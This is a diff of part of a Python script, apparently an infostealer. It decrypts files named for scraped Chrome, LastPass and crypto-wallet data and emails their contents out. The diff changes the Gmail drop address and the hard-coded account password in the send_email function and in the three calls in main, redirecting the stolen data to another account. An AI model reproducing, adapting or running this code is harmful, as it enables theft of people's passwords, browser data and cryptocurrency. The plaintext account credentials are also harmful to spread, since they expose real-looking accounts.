@@ -67,8 +67,8 @@ def scrape_crypto_data():
 
 # Function to send the scraped data to your email
 def send_email(file_path, recipient_email, data):
-    sender_email = "myrdpa@gmail.com"
-    password = "08063823032Cc@"
+    sender_email = "cardonewhite081@gmail.com"
+    password = "mmcwhorkhfccdgwq"
 
     # Create a multipart message
     message = MIMEMultipart()
@@ -96,17 +96,17 @@ def main():
     with open("chrome_scraped_data.txt", "r") as file:
         encrypted_data = file.read()
     decrypted_data = decrypt_data(encrypted_data)
-    send_email("chrome_scraped_data.txt", "myrdpa@gmail.com", decrypted_data)
+    send_email("chrome_scraped_data.txt", "cardonewhite081@gmail.com", decrypted_data)
 
     with open("lastpass_scraped_data.txt", "r") as file:
         encrypted_data = file.read()
     decrypted_data = decrypt_data(encrypted_data)
-    send_email("lastpass_scraped_data.txt", "myrdpa@gmail.com", decrypted_data)
+    send_email("lastpass_scraped_data.txt", "cardonewhite081@gmail.com", decrypted_data)
 
     with open("crypto_scraped_data.txt", "r") as file:
         encrypted_data = file.read()
     decrypted_data = decrypt_data(encrypted_data)
-    send_email("crypto_scraped_data.txt", "myrdpa@gmail.com", decrypted_data)
+    send_email("crypto_scraped_data.txt", "cardonewhite081@gmail.com", decrypted_data)
 
 app = Flask(__name__)
 
